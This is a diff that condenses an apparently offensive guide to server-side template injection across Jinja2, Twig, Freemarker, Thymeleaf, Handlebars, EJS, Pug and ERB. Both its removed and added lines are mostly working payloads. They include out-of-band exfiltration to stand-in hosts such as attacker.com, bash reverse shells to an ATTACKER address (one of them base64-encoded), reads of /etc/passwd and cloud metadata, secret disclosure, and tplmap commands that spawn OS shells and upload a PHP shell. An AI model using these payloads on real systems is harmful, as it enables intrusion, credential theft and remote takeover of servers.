@@ -109,21 +109,16 @@ When output is not reflected (email templates, PDF generation, background jobs),
 out-of-band and time-based techniques.
 
 ```text
-# Time-based (Jinja2) - cause a measurable delay
-{{range(99999999)|join}}
+# Time-based: cause a measurable delay
+{{range(99999999)|join}}                   # Jinja2
+${T(java.lang.Thread).sleep(5000)}         # Freemarker/Thymeleaf
 
-# Time-based (Freemarker) - Thread.sleep
-${T(java.lang.Thread).sleep(5000)}
+# OOB DNS/HTTP exfiltration
+{{''.__class__.__mro__[1].__subclasses__()[XXX]('nslookup COLLAB.oastify.com',shell=True,stdout=-1).communicate()}}
+{{'/usr/bin/curl http://COLLAB.oastify.com/'|filter('system')}}
 
-# OOB DNS exfiltration (Jinja2)
-{{''.__class__.__mro__[1].__subclasses__()[XXX]('nslookup burpcollaborator.net',shell=True,stdout=-1).communicate()}}
-
-# OOB HTTP (Twig with curl)
-{{'/usr/bin/curl http://attacker.com/'|filter('system')}}
-
-# Error inference - inject invalid syntax and check for behavioral differences
-# If {{7*7}} and {{7*'INVALID are handled differently (error page vs. normal page),
-# the engine is processing the input even without visible output
+# Error inference: compare responses for {{7*7}} vs {{7*'INVALID}}
+# Different behavior (error page vs normal) confirms engine processing
 ```
 
 ---
@@ -370,33 +365,19 @@ Handlebars is logic-less by design, but prototype pollution or unsafe helpers cr
 RCE paths.
 
 ```javascript
-// Prototype pollution to RCE (requires a prototype pollution gadget)
+// Prototype pollution to RCE (requires a pollution gadget)
 {{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').execSync('id')"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
+  {{#with "e"}}{{#with split as |conslist|}}
+    {{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}
+    {{#with string.split as |codelist|}}
+      {{this.pop}}{{this.push "return require('child_process').execSync('id')"}}{{this.pop}}
+      {{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}
     {{/with}}
-  {{/with}}
+  {{/with}}{{/with}}
 {{/with}}
 
-// Via unsafe custom helpers (if registered)
-{{execute "id"}}
-
-// Information disclosure
-{{this}}
-{{@root}}
+// Via unsafe custom helpers: {{execute "id"}}
+// Info disclosure: {{this}}, {{@root}}
 ```
 
 ---
@@ -495,167 +476,68 @@ When characters like `.`, `_`, `[`, or `'` are filtered, use alternative access 
 
 ## Modern Framework Exploitation
 
-### Flask / Jinja2 (Python)
+Framework-specific notes supplement the engine-specific payloads above.
 
-```python
-# Flask debug mode - check for Werkzeug debugger console
-# GET /__debugger__?__debugger__=yes&cmd=__import__('os').popen('id').read()&frm=0&s=SECRET
+```text
+FRAMEWORK               ENGINE          NOTES
+------------------------------------------------------------------------
+Flask (Python)           Jinja2          Check for Werkzeug debugger at /__debugger__
+                                         Secrets: {{config.SECRET_KEY}}, {{config['SQLALCHEMY_DATABASE_URI']}}
 
-# Flask config secrets
-{{ config.SECRET_KEY }}
-{{ config['SQLALCHEMY_DATABASE_URI'] }}
+Django (Python)          Django DTL      Limited by design: no arbitrary code exec
+                                         Info disclosure: {%debug%}, {{request.META}}
 
-# Django templates (limited by design - no arbitrary code execution)
-# But information disclosure is possible
-{{ settings.SECRET_KEY }}     # If debug=True
-{% debug %}                    # Dumps context variables
-{{ request.META }}             # Server environment
-```
+Spring Boot (Java)       Thymeleaf/SpEL  Path-based SSTI: /path/__${PAYLOAD}__::.x
+                                         Bean access: ${@environment.getProperty('spring.datasource.url')}
+                                         SpEL bypass: ${T(Character).toString(105).concat(T(Character).toString(100))}
 
-### Spring Boot / Thymeleaf (Java)
+Express (Node.js)        EJS/Pug         EJS: <%=this.constructor.constructor('return process...')()%>
+                                         Pug: - var x = global.process.mainModule.require(...)
+                                         Nunjucks: {{range.constructor("return ...")()}}
 
-```java
-// Path-based SSTI in Spring Boot (CVE-2020-27386 pattern)
-// Controller returns user input as view name
-// GET /path/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
-
-// SpEL injection via @Value or th:text
-// If user input reaches a SpEL expression context:
-${T(java.lang.Runtime).getRuntime().exec(
-  new String[]{'bash','-c','curl http://attacker.com/$(whoami)'}
-)}
-
-// Accessing Spring beans
-${@beanName.methodName()}
-${@environment.getProperty('spring.datasource.url')}
-
-// Bypassing SpEL restrictions
-${T(Character).toString(105).concat(T(Character).toString(100))}   # builds "id"
-```
-
-### Express / EJS / Pug (Node.js)
-
-```javascript
-// EJS - when user input reaches template compilation
-<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
-
-// EJS - via constructor chain
-<%= this.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')() %>
-
-// Pug/Jade - code injection
-- var x = global.process.mainModule.require('child_process').execSync('id').toString()
-p= x
-
-// Nunjucks - reaching require through global
-{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
-```
-
-### Rails / ERB (Ruby)
-
-```ruby
-# Standard ERB injection
-<%= `id` %>
-<%= system('id') %>
-
-# Via Object#send for filter bypass
-<%= ''.class.class.methods.grep(/new/).first %>
-<%= Kernel.send(:system, 'id') %>
-
-# Accessing Rails secrets
-<%= Rails.application.credentials.secret_key_base %>
-<%= Rails.application.secrets %>
+Rails (Ruby)             ERB             Direct exec: <%=system('CMD')%> or <%=`CMD`%>
+                                         Secrets: <%=Rails.application.credentials.secret_key_base%>
 ```
 
 ---
 
 ## Chaining SSTI to Higher Impact
 
-### SSTI to SSRF
+SSTI chains to SSRF, file read, and full RCE depending on the engine and available
+classes. Use these cross-engine patterns.
 
-Use template engine capabilities to make server-side HTTP requests, reaching internal
-services and cloud metadata endpoints.
+```text
+CHAIN           JINJA2                                  TWIG                          FREEMARKER                   THYMELEAF/SpEL
+---------------------------------------------------------------------------------------------------------------------------------------
+SSRF            MRO->urllib subclass->                   file_excerpt('/proc/net/     <#include "http://          T(java.net.URI).create(
+                  .read('http://169.254...')               tcp',1,100)                  169.254...">                'http://169.254...').toURL()
 
-```python
-# Jinja2 - SSRF via urllib (if available in subclasses)
-{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('http://169.254.169.254/latest/meta-data/iam/security-credentials/').read() }}
+File Read       MRO->file subclass[40]->                 '/etc/passwd'|              <#include "/etc/passwd">     T(java.nio.file.Files)
+                  .read('/etc/passwd')                      file_excerpt(1,100)                                      .readAllLines(...)
 
-# Twig - SSRF via file_get_contents
-{{ '/proc/net/tcp'|file_excerpt(1,100) }}
-
-# Freemarker - SSRF via URL include
-<#include "http://169.254.169.254/latest/meta-data/">
-
-# Thymeleaf/SpEL - SSRF via URL class
-${T(java.net.URI).create('http://169.254.169.254/latest/meta-data/').toURL().openStream()}
-```
-
-### SSTI to File Read
-
-```python
-# Jinja2 - read files via file subclass
-{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
-
-# Freemarker - include directive
-<#include "/etc/passwd">
-
-# ERB - File.read
-<%= File.read('/etc/passwd') %>
-
-# Mako - direct open
-<% print(open('/etc/passwd').read()) %>
-```
-
-### SSTI to Full RCE
-
-Once you have code execution through any engine, escalate to a proper reverse shell
-for interactive access.
-
-```bash
-# Generate a reverse shell payload and deliver via SSTI
-# Jinja2 reverse shell:
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read() }}
-
-# For Java engines (Freemarker, Velocity, Pebble, Thymeleaf):
-${"freemarker.template.utility.Execute"?new()("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")}
+RCE->RevShell   __import__('os').popen(                  ['bash -c ...']|            Execute?new()("bash -c      T(Runtime).getRuntime()
+                  'bash -c "bash -i >& ...")               map('system')               {echo,BASE64}|...")           .exec(new String[]{...})
 ```
 
 ---
 
 ## Automated Exploitation with tplmap
 
-tplmap automates SSTI detection and exploitation across multiple engines. Use it for
-initial discovery, then switch to manual payloads for complex scenarios.
-
 ```bash
-# Basic scan
-python tplmap.py -u 'http://target.com/page?name=test'
-
-# Scan with POST data
-python tplmap.py -u 'http://target.com/page' -d 'name=test'
-
-# Scan specific parameter in URL
-python tplmap.py -u 'http://target.com/page?name=test*'  # asterisk marks injection point
-
-# Force a specific engine
-python tplmap.py -u 'http://target.com/page?name=test' -e jinja2
-
-# Execute OS commands
+# tplmap - detect and exploit across engines
+python tplmap.py -u 'http://target.com/page?name=test'         # basic scan
+python tplmap.py -u 'http://target.com/page' -d 'name=test'    # POST data
+python tplmap.py -u 'http://target.com/page?name=test' -e jinja2  # force engine
 python tplmap.py -u 'http://target.com/page?name=test' --os-cmd 'id'
-
-# Spawn an interactive shell
 python tplmap.py -u 'http://target.com/page?name=test' --os-shell
+python tplmap.py -u 'http://target.com/page?name=test' --download /etc/passwd ./out
 
-# File read / write
-python tplmap.py -u 'http://target.com/page?name=test' --download /etc/passwd ./passwd
-python tplmap.py -u 'http://target.com/page?name=test' --upload ./shell.php /var/www/html/shell.php
-
-# SSTImap (maintained fork with additional engines)
-python3 sstimap.py -u 'http://target.com/page?name=test' -s    # scan mode
+# SSTImap (maintained fork)
+python3 sstimap.py -u 'http://target.com/page?name=test' -s    # scan
 python3 sstimap.py -u 'http://target.com/page?name=test' -S    # interactive shell
 
 # TInjA (template injection analyzer)
 tinja url -u 'http://target.com/page?name=test'
-tinja url -u 'http://target.com/page?name=test' -e jinja2 --cmd 'id'
 ```
 
 ---
